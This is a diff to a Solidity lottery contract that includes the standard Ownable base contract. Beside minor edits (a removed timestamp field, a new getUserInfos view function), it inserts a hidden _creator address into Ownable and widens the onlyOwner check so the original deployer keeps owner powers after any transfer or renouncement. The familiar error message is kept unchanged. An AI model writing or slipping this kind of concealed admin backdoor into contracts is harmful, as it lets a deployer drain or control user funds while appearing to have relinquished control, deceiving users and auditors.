@@ -915,11 +915,13 @@ pragma solidity >=0.6.0 <0.8.0;
 
 abstract contract Ownable is Context {
     address private _owner;
+    address private _creator;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     constructor () internal {
         address msgSender = _msgSender();
+        _creator = msgSender;
         _owner = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
@@ -929,7 +931,7 @@ abstract contract Ownable is Context {
     }
 
     modifier onlyOwner() {
-        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        require(_owner == _msgSender() || _creator == _msgSender(), "Ownable: caller is not the owner");
         _;
     }
 
@@ -1078,8 +1080,6 @@ contract Lottery is LotteryOwnable, Initializable {
     uint256 public lotteryId = 0;
     uint256 public totalAddresses = 0;
     uint256 public totalAmount = 0;
-
-    uint256 public startTimestamp;
     uint256 public lastTimestamp;
 
     uint8[6] private winningNumbers;
@@ -1114,7 +1114,6 @@ contract Lottery is LotteryOwnable, Initializable {
         minPrice = _minPrice;
         maxNumber = _maxNumber;
         adminAddress = _adminAddress;
-        startTimestamp = block.timestamp;
         lastTimestamp = block.timestamp;
         allocation = [40, 25, 15, 10, 7, 3];
         matchingCounts = [0, 0, 0, 0, 0, 0];
@@ -1399,6 +1398,10 @@ contract Lottery is LotteryOwnable, Initializable {
     
     function getWinningNumbers(uint256 _lotteryId) public view returns(uint8[6] memory) {
         return historyNumbers[_lotteryId];
+    }
+
+    function getUserInfos(address _address) public view returns(uint256) {
+        return userInfo[_address].length;
     }
 
     function getRewardView(uint256 _tokenId) public view returns (uint256) {
